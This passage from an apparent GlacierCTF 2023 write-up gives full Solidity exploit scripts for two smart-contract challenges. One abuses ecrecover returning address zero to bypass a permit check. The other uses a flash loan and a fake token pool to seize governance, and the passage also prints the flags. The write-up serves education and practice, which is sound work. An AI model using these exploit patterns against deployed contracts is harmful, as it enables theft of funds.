</span><span>    bytes32 digest </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(</span><span style=color:#183691>"</span><span style=color:#0086b3>\x19\x01</span><span style=color:#183691>"</span><span>, </span><span style=color:#795da3;font-weight:700>_getDomainSeparator</span><span>(), </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encode</span><span>(</span><span style=color:#0086b3>PERMIT_TYPEHASH</span><span>, from, to, tokenId, nonces[from]</span><span style=color:#a71d5d;font-weight:700>++</span><span>, deadline))));
</span><span>    address signer </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>ecrecover</span><span>(digest, v, r, s);
</span><span>    </span><span style=color:#62a35c>require</span><span>(signer </span><span style=color:#a71d5d;font-weight:700>== </span><span>from, </span><span style=color:#183691>"Ticket: invalid permit"</span><span>);
</span><span>    </span><span style=color:#795da3;font-weight:700>_transfer</span><span>(from, to, tokenId);
</span><span>}
</span></code></pre><p>We can transfer ticket to an address if we have the signature of a ticket owner. We cant get the signature of someone. Lets see who are the owners of some tickets.<pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#795da3;font-weight:700>mapping </span><span>(uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span>address) private _owners;
</span></code></pre><p>Here we know that the default owner of a ticket is <code>0</code> address. In the <code>burn()</code> function also updates the owner of the ticket to <code>address(0)</code>. So, If we managed to get the signature of the <code>address(0)</code> and set the from address to <code>0</code> as the from address check is not done inside the transferWithPermit() function.<p>By simply researching about ecrecover we can get to know that values of <code>v - 0, r - 0, s - 0</code> will recover the address of <code>0</code>. Now passing the from address as 0, signature values as 0 will bypass the signature check and transfers a ticket to our specified address. Then simply calling takeRide function will increment the tripsTaken variable.<p><code>ChairLiftAttack.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>18</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Ticket} </span><span style=color:#a71d5d;font-weight:700>from  </span><span style=color:#183691>"../src/ChairLift/Ticket.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{ChairLift} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/ChairLift/ChairLift.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Setup} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/ChairLift/Setup.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Script} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{console} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span>contract AttackScript is Script{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Success"</span><span>);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Setup public setupContract </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Setup</span><span>(</span><span style=color:#0086b3>0xB09c4177c15f9C5d4F6a8f1Bfa06cF4b77907Ff7</span><span>);
</span><span>    ChairLift public chairlift </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>ChairLift</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(setupContract.</span><span style=color:#795da3;font-weight:700>TARGET</span><span>()));
</span><span>    Ticket public ticket </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Ticket</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(chairlift.</span><span style=color:#795da3;font-weight:700>ticket</span><span>()));
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        ticket.</span><span style=color:#795da3;font-weight:700>transferWithPermit</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>), </span><span style=color:#795da3;font-weight:700>address</span><span>(this), </span><span style=color:#0086b3>1</span><span>, block.timestamp</span><span style=color:#a71d5d;font-weight:700>+</span><span style=color:#0086b3>100</span><span>, </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>);
</span><span>        chairlift.</span><span style=color:#795da3;font-weight:700>takeRide</span><span>(</span><span style=color:#0086b3>1</span><span>);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#969896;font-style:italic>//gctf{Y0u_d1d_1t!_Y0u_r34ch3d_th3_p34k!}
</span></code></pre><p>To solve the challenge run the following command<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>forge script script/ChairLiftAttack.s.sol:AttackScript --rpc-url </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>RPC-URL</span><span style=color:#a71d5d;font-weight:700>> </span><span>--private-key </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>REDACTED</span><span style=color:#a71d5d;font-weight:700>> </span><span>--broadcast
</span></code></pre><h2 id=the-concil-of-apes-456pts>The Concil of Apes [456pts]</h2><pre style=color:#323232;background-color:#fff><code><span>Description : 
</span><span>
</span><span>On top of the glacier you run into a bunch of monkeys. They are screaching at each other, throwin feces around and won't let you pass. You will need to somehow get rid of them to finish your mission.
</span><span>
</span><span>author: J4X
</span><span>
</span><span>nc chall.glacierctf.com 13380
</span><span>
</span></code></pre><p>Attached files<ol><li><a href=https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/Setup.sol target=_blank>Setup.sol</a><li><a href=https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/CouncilOfApes.sol target=_blank>CouncilOfApes.sol</a><li><a href=https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/IcyExchange.sol target=_blank>IcyExchange.sol</a><li><a href=https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/IcyPool.sol target=_blank>IcyPool.sol</a><li><a href=https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/TotallyNotCopiedToken.sol target=_blank>TotallyNotCopiedToken.sol</a><li><a href=https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/IERC20.sol target=_blank>IERC20.sol</a><li><a href=https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/ERC20.sol target=_blank>ERC20.sol</a></ol><p>This was an interesting and a bit of hard chall I would say, It took me more than an half day to understand the code base and solve the challenge.<p>To solve the challenge we need to understand the entire code base, how the tokens are deployed, what is our goal, etc.<p>At an high level our goal is to call the <code>dissolveCouncilOfTheApes()</code> function of <code>CouncilOfApes</code> contract. To call this function we need to upgrade our user class from <code>APE</code> to <code>GORILLA</code>. For this we should have more than <code>1_000_000_000</code> votes. An <code>APE</code> can vote it self with the <code>balanaBalance</code>. To get <code>1_000_000_000</code> votes we should have <code>1_000_000_000</code> bananabalance, but we only have 1.<p>To get more bananaBalance we should exchange our <code>IcyTokens</code>, But we dont have them. We can get the <code>FlashLoan</code> of <code>IcyTokens</code>. To get pass the checks in FlashLoan function we should deploy our own Token with totalSupply less than <code>100_000_000</code>. And we need to create pool on <code>IcyExchange</code> contract.<p>After creating a fake custom token and creating a pool we can able to get a FlashLoan of required amount. Then I took flashloan and used those IcyTokens to buy bananaBalance and voted my self to update the class to GORILLA from APE. Then there is way to mint more bananaBalance using <code>issueBanana()</code> function then I used <code>sell()</code> to exchange bananaBalance with <code>IcyTokens</code> and I repayed those tokens back to IcyExchange cause I took flashloan from it.<p><code>MyNewToken.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>20</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../../src/CouncilOfApes/ERC20.sol"</span><span>;
</span><span>
</span><span>contract MyNewToken is </span><span style=color:#0086b3>ERC20 
</span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address owner, string memory name, string memory symbol) </span><span style=color:#795da3;font-weight:700>ERC20</span><span>(name, symbol) 
</span><span>    {
</span><span>        </span><span style=color:#795da3;font-weight:700>_mint</span><span>(owner, </span><span style=color:#0086b3>100_000_000</span><span>);
</span><span>    }
</span><span>}
</span></code></pre><p><code>CouncilOfCapesAttack.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>20</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./MyNewToken.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{IcyExchange} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../../src/CouncilOfApes/IcyExchange.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Setup} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../../src/CouncilOfApes/Setup.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Script} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{console} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span>contract AttackScript is Script{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack{value</span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>10 </span><span>ether}().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Success"</span><span>);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack {
</span><span>    MyNewToken public myToken </span><span style=color:#a71d5d;font-weight:700>= new </span><span>MyNewToken(</span><span style=color:#795da3;font-weight:700>address</span><span>(this), </span><span style=color:#183691>"My New H4ck3r Token"</span><span>, </span><span style=color:#183691>"H4CK"</span><span>);
</span><span>    Setup public setup </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Setup</span><span>(</span><span style=color:#0086b3>0x821B54EfB659A64d5b0A3145811b290A997705C0</span><span>);
</span><span>    IcyExchange public </span><span style=color:#0086b3>TARGET </span><span style=color:#a71d5d;font-weight:700>= </span><span>setup.</span><span style=color:#795da3;font-weight:700>TARGET</span><span>();
</span><span>    address public _icyToken </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>icyToken</span><span>());
</span><span>
</span><span>    bytes32 public theEvilWords </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#183691>"Kevin come out of the basement, dinner is ready."</span><span>);
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable{
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>10 </span><span>ether);
</span><span>    }
</span><span>
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        
</span><span>        </span><span style=color:#969896;font-style:italic>//Become an ape
</span><span>        bytes32 holyWords </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#183691>"I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing"</span><span>);
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>().</span><span style=color:#795da3;font-weight:700>becomeAnApe</span><span>(holyWords);
</span><span>
</span><span>    
</span><span>        </span><span style=color:#969896;font-style:italic>// create a pool on IcyExchange
</span><span>        myToken.</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>TARGET</span><span>), </span><span style=color:#0086b3>100_000</span><span>);
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.createPool{value: </span><span style=color:#0086b3>1 </span><span>ether}(</span><span style=color:#795da3;font-weight:700>address</span><span>(myToken));
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Take flash loan
</span><span>        myToken.</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>TARGET</span><span>), </span><span style=color:#795da3;font-weight:700>type</span><span>(uint256).max); </span><span style=color:#969896;font-style:italic>// we dont know how many tokens it needs, give as much as possible
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>collateralizedFlashloan</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(myToken), </span><span style=color:#0086b3>1_000_000_000</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(this));
</span><span>
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>receiveFlashLoan</span><span>(uint256 amount) </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>icyToken</span><span>().</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>()), amount);
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>().</span><span style=color:#795da3;font-weight:700>buyBanana</span><span>(amount);
</span><span>
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>().</span><span style=color:#795da3;font-weight:700>vote</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this), amount);
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>().</span><span style=color:#795da3;font-weight:700>claimNewRank</span><span>();
</span><span>        
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>().</span><span style=color:#795da3;font-weight:700>issueBanana</span><span>(amount, </span><span style=color:#795da3;font-weight:700>address</span><span>(this));
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>().</span><span style=color:#795da3;font-weight:700>sellBanana</span><span>(amount);
</span><span>
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>icyToken</span><span>().</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>TARGET</span><span>), amount);
</span><span>
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>council</span><span>().</span><span style=color:#795da3;font-weight:700>dissolveCouncilOfTheApes</span><span>(theEvilWords);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>fallback</span><span>() external payable { }
</span><span>}
</span><span>
</span><span style=color:#969896;font-style:italic>//gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}
</span></code></pre><p>To solve run this command<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>forge script script/CouncilOfApesAttack/CouncilOfApesAttack.s.sol:AttackScript --rpc-url </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>RPC-URL</span><span style=color:#a71d5d;font-weight:700>> </span><span>--private-key </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>REDACTED</span><span style=color:#a71d5d;font-weight:700>> </span><span>--broadcast
</span></code></pre><p>Note that understanding entire protocol is necessary to solve this challenge.<hr><p>Thank you for visiting!!!</section></article></main></div>